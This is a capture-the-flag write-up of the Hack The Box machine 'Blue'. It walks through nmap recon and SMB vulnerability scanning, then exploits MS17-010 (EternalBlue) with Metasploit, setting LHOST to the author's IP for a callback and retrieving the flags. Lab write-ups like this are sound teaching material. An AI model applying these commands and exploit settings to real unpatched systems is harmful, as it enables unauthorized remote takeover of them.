# Blue

## Recon
I start by scanning the machine with nmap: `nmap -sV -sC -Pn 10.10.10.40 `. After a few moments, the output shows:
```
└─$ nmap -sV -sC -Pn 10.10.10.40 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-22 02:31 EDT
Nmap scan report for 10.10.10.40
Host is up (0.30s latency).
Not shown: 991 closed tcp ports (conn-refused)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

That is a lot of MSRPC services running on a lot of open ports, however, the first thing that catches my eye is SMB (Server Messaging Block) open and running on port 445. For those that don't know, SMB is used for file hosting and sharing, and since it's open, I can have a look at what's in this directory.

I enter the command `smbclient -L 10.10.10.40` and see the following:
```
     Sharename       Type      Comment
     ---------       ----      -------
     ADMIN$          Disk      Remote Admin
     C$              Disk      Default share
     IPC$            IPC       Remote IPC
     Share           Disk      
     Users           Disk
```

After browswing SMB on this machine, I found that most directories are either empty or restricted, leaving me empty handed. The recon on this port does not stop here though, we can use nmap to scan for vulnerabilities on this port as well. To do this we'll use `nmap -Pn -p 445 --script smb-vuln-* 10.10.10.40`. Nmap can be loaded with many script to be run alongside port scannig. In this command we're scanning port 445 specifically, and attempting to run any smb vulnerability script against it on the target machine. Doing so shows this:
```
Host script results:
|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_smb-vuln-ms10-054: false
```
The machine is vulberable to MS17-010/CVE-2017-0143, aka EternalBlue.

### EternalBlue
EternalBlue was initially developed by the NSA, but was leaked after a successful cyber attack against them. The exploit sends specially crafted packets to the target server which can lead to RCE, randsomware and worm-like attempts at infiltration. 

The most well-known attack utilizing EternalBlue to date is the WannaCry ransomware attacks. 

Although this exploit has been patched out in many versions of Windows, if the software update has not been installed, the system is still vulnerable.

## Foothold and RCE
To deploy EternalBLue to our target, I decided to use Metasploit. I loaded `exploit/windows/smb/ms17_010_eternalblue`, set RHOSTS 10.10.10.40 and LHOST to 10.10.14.8 (my ip address) and run the exploit. Within seconds I had remote access to the machine. Scary!

From here I collected the user flag from `C:\Users\haris\Desktop` and the system flag from `C:\Users\Administrator\Desktop`
